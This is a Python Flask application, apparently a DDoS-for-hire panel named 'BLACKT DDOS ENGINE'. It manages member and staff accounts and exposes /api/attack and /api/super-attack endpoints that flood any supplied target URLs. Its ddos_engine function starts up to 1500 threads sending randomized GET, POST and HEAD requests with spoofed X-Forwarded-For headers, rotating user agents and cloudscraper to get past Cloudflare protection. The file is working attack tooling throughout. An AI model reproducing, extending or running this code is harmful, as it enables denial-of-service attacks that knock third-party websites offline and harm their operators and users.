import os
import json
import time
import random
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests
import cloudscraper
from fake_useragent import UserAgent

app = Flask(__name__)

CONFIG = {
    "max_threads": 1500,
    "default_threads": 500,
    "timeout": 5,
    "delay_min": 0.01,
    "delay_max": 0.05
}

class Database:
    def __init__(self):
        self.db_file = "database.json"
        self.lock = threading.Lock()
        self.data = self._load()
    
    def _load(self):
        if os.path.exists(self.db_file):
            with open(self.db_file, 'r') as f:
                return json.load(f)
        return {"users": {}, "logs": [], "stats": {"total_members": 0, "total_staff": 0, "total_dev": 0}}
    
    def _save(self):
        with self.lock:
            with open(self.db_file, 'w') as f:
                json.dump(self.data, f, indent=2)
    
    def get_user(self, username):
        return self.data["users"].get(username)
    
    def add_user(self, username, team="Member"):
        if username in self.data["users"]:
            return False
        self.data["users"][username] = {
            "team": team,
            "created": datetime.now().isoformat(),
            "usage_count": 0,
            "last_active": datetime.now().isoformat(),
            "is_active": True
        }
        if team == "Member":
            self.data["stats"]["total_members"] += 1
        elif team == "Staff":
            self.data["stats"]["total_staff"] += 1
        elif team == "Developer":
            self.data["stats"]["total_dev"] += 1
        self._save()
        return True
    
    def remove_user(self, username):
        if username not in self.data["users"]:
            return False
        team = self.data["users"][username]["team"]
        del self.data["users"][username]
        if team == "Member":
            self.data["stats"]["total_members"] -= 1
        elif team == "Staff":
            self.data["stats"]["total_staff"] -= 1
        elif team == "Developer":
            self.data["stats"]["total_dev"] -= 1
        self._save()
        return True
    
    def update_usage(self, username):
        if username not in self.data["users"]:
            return False
        user = self.data["users"][username]
        user["usage_count"] += 1
        user["last_active"] = datetime.now().isoformat()
        self._save()
        return True
    
    def add_log(self, message):
        self.data["logs"].insert(0, {"timestamp": datetime.now().isoformat(), "message": message})
        if len(self.data["logs"]) > 200:
            self.data["logs"] = self.data["logs"][:200]
        self._save()
    
    def get_all_data(self):
        return {
            "users": self.data["users"],
            "logs": self.data["logs"][:50],
            "stats": self.data["stats"]
        }

db = Database()
ua = UserAgent()

scraper = cloudscraper.create_scraper(
    browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
)

def ddos_engine(target, threads, use_proxy=False):
    success = 0
    fail = 0
    running = True
    lock = threading.Lock()
    
    def worker():
        nonlocal success, fail
        while running:
            try:
                headers = {
                    'User-Agent': ua.random,
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive'
                }
                methods = ['get', 'post', 'head']
                chosen = random.choice(methods)
                if chosen == 'get':
                    resp = scraper.get(target, headers=headers, timeout=CONFIG["timeout"])
                elif chosen == 'post':
                    resp = scraper.post(target, headers=headers, data={"x": "A"*1024}, timeout=CONFIG["timeout"])
                else:
                    resp = scraper.head(target, headers=headers, timeout=CONFIG["timeout"])
                with lock:
                    success += 1
                    if success % 100 == 0:
                        print(f"[+] {target} → {resp.status_code} | Success: {success} | Fail: {fail}")
            except:
                with lock:
                    fail += 1
            time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))
    
    for i in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    return lambda: running

@app.route('/api/data')
def get_data():
    return jsonify(db.get_all_data())

@app.route('/api/user', methods=['POST'])
def add_user():
    data = request.get_json()
    username = data.get('username')
    team = data.get('team', 'Member')
    if not username:
        return jsonify({"error": "Username required"}), 400
    if db.add_user(username, team):
        db.add_log(f"User {username} added as {team}")
        return jsonify({"message": "User added"}), 201
    return jsonify({"error": "User exists"}), 400

@app.route('/api/user/<username>', methods=['DELETE'])
def delete_user(username):
    if db.remove_user(username):
        db.add_log(f"User {username} removed")
        return jsonify({"message": "User removed"}), 200
    return jsonify({"error": "User not found"}), 404

@app.route('/api/announcement', methods=['POST'])
def post_announcement():
    data = request.get_json()
    title = data.get('title')
    content = data.get('content')
    if not title or not content:
        return jsonify({"error": "Title and content required"}), 400
    db.add_log(f"Announcement: {title} - {content}")
    return jsonify({"message": "Announcement posted"}), 201

@app.route('/api/attack', methods=['POST'])
def start_attack():
    data = request.get_json()
    target = data.get('target')
    threads = int(data.get('threads', 500))
    username = data.get('username', 'unknown')
    if not target:
        return jsonify({"error": "Target required"}), 400
    threads = min(threads, CONFIG["max_threads"])
    db.update_usage(username)
    db.add_log(f"Attack started on {target} by {username}")
    ddos_engine(target, threads)
    return jsonify({"message": "Attack started", "target": target, "threads": threads})

@app.route('/api/super-attack', methods=['POST'])
def start_super_attack():
    data = request.get_json()
    targets = data.get('targets', '').split(',')
    threads = int(data.get('threads', 1000))
    username = data.get('username', 'unknown')
    targets = [t.strip() for t in targets if t.strip()]
    if not targets:
        return jsonify({"error": "Targets required"}), 400
    threads_per_target = max(50, threads // len(targets))
    for target in targets:
        db.update_usage(username)
        db.add_log(f"Super attack started on {target} by {username}")
        ddos_engine(target, threads_per_target)
    return jsonify({"message": "Super attack started", "targets": targets, "threads_per_target": threads_per_target})

@app.route('/')
def home():
    return jsonify({"status": "BLACKT DDOS ENGINE RUNNING", "version": "FINAL"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
